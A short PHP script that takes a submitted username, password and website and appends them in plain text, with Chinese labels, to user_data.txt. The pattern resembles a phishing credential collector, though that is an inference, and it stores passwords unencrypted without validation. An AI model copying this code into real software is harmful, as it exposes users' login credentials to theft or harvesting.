<?php
// saveFormData.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username =$_POST["username"];
    $password =$_POST["psw"];
    $website =$_POST["website"];
    file_put_contents("user_data.txt", "用户名: " . $username . ", 密码: " .$password . ", 网站: " . $website . "\n", FILE_APPEND);
    echo "数据已保存";
} else {
    echo "非法访问";
}
?>
